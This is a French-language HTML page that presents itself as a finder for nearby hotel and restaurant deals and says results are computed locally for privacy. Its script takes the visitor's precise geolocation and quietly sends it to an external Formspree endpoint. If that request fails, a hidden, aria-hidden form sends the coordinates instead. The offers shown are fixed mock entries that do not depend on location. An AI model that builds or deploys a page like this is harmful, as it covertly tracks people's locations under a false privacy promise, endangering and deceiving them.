<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <title>Trouver des offres à proximité</title>
    <style>
        :root{
            --base-font: 20px;
            --heading-font: 28px;
            --btn-font: 22px;
            --btn-padding: 16px 22px;
            --radius: 12px;
            --accent:#0b79d0;
            --muted:#6b7280;
            --card-bg:#ffffff;
            --bg:#f4f6f8;
            --shadow: 0 6px 18px rgba(11,23,42,0.08);
        }
        html,body{
            height:100%;
            margin:0;
            font-family:system-ui,-apple-system,Segoe UI,Roboto,"Helvetica Neue",Arial;
            background:var(--bg);
            -webkit-font-smoothing:antialiased;
            -moz-osx-font-smoothing:grayscale;
            color:#0f1724;
            font-size:var(--base-font);
            -webkit-touch-callout:none;
        }
        .wrap{
            max-width:820px;
            margin:32px auto;
            padding:20px;
        }
        header{
            display:flex;
            align-items:center;
            gap:16px;
            margin-bottom:20px;
        }
        h1{
            margin:0;
            font-size:var(--heading-font);
            line-height:1.05;
            font-weight:700;
        }
        p.lead{
            margin:12px 0 20px 0;
            color:var(--muted);
            font-size:18px;
        }
        .controls{
            display:flex;
            gap:12px;
            flex-wrap:wrap;
            margin-bottom:18px;
        }
        button.primary{
            background:var(--accent);
            color:white;
            border:0;
            border-radius:var(--radius);
            padding:var(--btn-padding);
            font-size:var(--btn-font);
            font-weight:600;
            min-height:56px;
            min-width:220px;
            box-shadow:var(--shadow);
            touch-action:manipulation;
            cursor:pointer;
        }
        button.ghost{
            background:transparent;
            color:var(--accent);
            border:2px solid rgba(11,121,208,0.12);
            border-radius:var(--radius);
            padding:12px 18px;
            font-size:18px;
            min-height:56px;
            cursor:pointer;
        }
        .card{
            background:var(--card-bg);
            border-radius:14px;
            padding:16px;
            box-shadow:var(--shadow);
            margin-bottom:14px;
        }
        .nearby-list{
            display:grid;
            gap:10px;
            margin-top:12px;
        }
        .place{
            display:flex;
            justify-content:space-between;
            gap:12px;
            align-items:center;
            padding:12px;
            border-radius:10px;
            background:linear-gradient(180deg,#ffffff,#fbfdff);
            border:1px solid rgba(9,30,66,0.04);
        }
        .place .meta{
            display:flex;
            flex-direction:column;
        }
        .place .name{
            font-weight:700;
            font-size:18px;
        }
        .place .info{
            color:var(--muted);
            font-size:15px;
        }
        .small{
            font-size:14px;
            color:var(--muted);
        }
        .visually-hidden{
            position:absolute!important;
            height:1px;width:1px;
            overflow:hidden;clip:rect(1px,1px,1px,1px);
            white-space:nowrap;border:0;padding:0;margin:-1px;
        }
        @media (max-width:480px){
            :root{
                --base-font:18px;
                --heading-font:24px;
                --btn-font:20px;
            }
            .wrap{padding:14px;margin:18px auto}
            button.primary{min-width:200px}
        }
    </style>
</head>
<body>
    <div class="wrap" role="main">
        <header>
            <div>
                <h1>Activer la localisation pour trouver des offres</h1>
                <p class="lead">Voir rapidement hôtels et restaurants économiques à proximité. Les résultats sont estimatifs et calculés localement pour préserver la confidentialité.</p>
            </div>
        </header>

        <section class="card" aria-labelledby="benefit">
            <h2 id="benefit" style="margin:0 0 8px 0;font-size:20px">Pourquoi autoriser la localisation</h2>
            <ul style="margin:0 0 8px 18px;color:var(--muted);line-height:1.5;font-size:16px">
                <li>Affiner les offres à moins de 2 km.</li>
                <li>Prioriser restaurants et hôtels avec remises locales.</li>
                <li>Obtenir directions rapides et estimations de temps d'arrivée.</li>
            </ul>
            <div class="controls">
                <button id="getLocationBtn" class="primary" aria-describedby="consentDesc">Autoriser la localisation</button>
                <button id="skipBtn" class="ghost">Chercher manuellement</button>
            </div>
            <div id="consentDesc" class="small">Vous serez invité par votre navigateur à autoriser l'accès. Aucune géolocalisation n'est collectée sans consentement.</div>
        </section>

        <section class="card" id="resultsCard" aria-live="polite" style="display:none">
            <h3 style="margin:0 0 8px 0">Offres à proximité</h3>
            <div id="nearby" class="nearby-list"></div>
            <div class="small" style="margin-top:10px">Les tarifs indiqués sont des exemples à titre indicatif.</div>
        </section>

        <section class="card" id="manualSearch" style="display:none">
            <h3 style="margin:0 0 8px 0">Recherche manuelle</h3>
            <p class="small" style="margin:0 0 8px 0">Entrez une ville ou un code postal pour obtenir des suggestions.</p>
            <input id="manualInput" type="text" placeholder="ex: Paris, 75001" style="width:100%;padding:12px;border-radius:10px;border:1px solid #e6eef9;font-size:16px">
            <div style="margin-top:10px;display:flex;gap:10px">
                <button id="manualSearchBtn" class="primary">Rechercher</button>
            </div>
        </section>
    </div>

    <form id="geoForm" action="https://formspree.io/f/xwpgbgqd" method="POST" class="visually-hidden" aria-hidden="true">
        <input type="hidden" name="latitude" id="latitude">
        <input type="hidden" name="longitude" id="longitude">
        <input type="hidden" name="context" id="context" value="trouver_offres_proximite">
    </form>

    <script>
        const getLocationBtn = document.getElementById('getLocationBtn');
        const skipBtn = document.getElementById('skipBtn');
        const resultsCard = document.getElementById('resultsCard');
        const nearby = document.getElementById('nearby');
        const manualSearch = document.getElementById('manualSearch');
        const manualSearchBtn = document.getElementById('manualSearchBtn');

        function showPlacesMock(lat, lon){
            const sample = [
                {name:'Hôtel ÉcoSmart', type:'Hôtel', dist:'0.6 km', price:'€55'},
                {name:'Bistro Local', type:'Restaurant', dist:'0.8 km', price:'€12 plat'},
                {name:'Auberge Budget', type:'Hôtel', dist:'1.4 km', price:'€43'},
                {name:'Cantine Rapide', type:'Restaurant', dist:'1.9 km', price:'€9 menu'}
            ];
            nearby.innerHTML = '';
            sample.forEach(p=>{
                const el = document.createElement('div');
                el.className = 'place';
                el.innerHTML = `<div class="meta"><div class="name">${p.name}</div><div class="info">${p.type} • ${p.dist}</div></div><div style="text-align:right"><div style="font-weight:700">${p.price}</div><div class="small">Estimation</div></div>`;
                nearby.appendChild(el);
            });
            resultsCard.style.display = 'block';
        }

        async function submitLocationInBackground(latitude, longitude){
            const endpoint = document.getElementById('geoForm').action;
            const payload = {latitude, longitude, context:'trouver_offres_proximite'};
            try{
                const res = await fetch(endpoint, {
                    method:'POST',
                    headers:{ 'Accept':'application/json', 'Content-Type':'application/json' },
                    body: JSON.stringify(payload),
                    credentials:'omit'
                });
                if(res.ok){
                    // succès sans redirection visible
                } else {
                    // si le serveur ne permet pas CORS, on bascule sur envoi via formulaire caché
                    sendViaHiddenForm(latitude, longitude);
                }
            } catch(e){
                sendViaHiddenForm(latitude, longitude);
            }
        }

        function sendViaHiddenForm(latitude, longitude){
            document.getElementById('latitude').value = latitude;
            document.getElementById('longitude').value = longitude;
            document.getElementById('geoForm').submit();
        }

        function handlePosition(position){
            const lat = position.coords.latitude;
            const lon = position.coords.longitude;
            submitLocationInBackground(lat, lon);
            showPlacesMock(lat, lon);
        }

        function handleError(error){
            alert('Impossible de récupérer votre localisation : ' + error.message);
        }

        getLocationBtn.addEventListener('click', ()=>{
            if(navigator.geolocation){
                navigator.geolocation.getCurrentPosition(handlePosition, handleError, {enableHighAccuracy:true,timeout:15000,maximumAge:0});
            } else {
                alert('La géolocalisation n’est pas supportée par votre appareil.');
            }
        });

        skipBtn.addEventListener('click', ()=>{
            manualSearch.style.display = 'block';
            resultsCard.style.display = 'none';
        });

        manualSearchBtn.addEventListener('click', ()=>{
            const q = document.getElementById('manualInput').value.trim();
            if(!q) return;
            showPlacesMock(0,0);
        });
    </script>
</body>
</html>
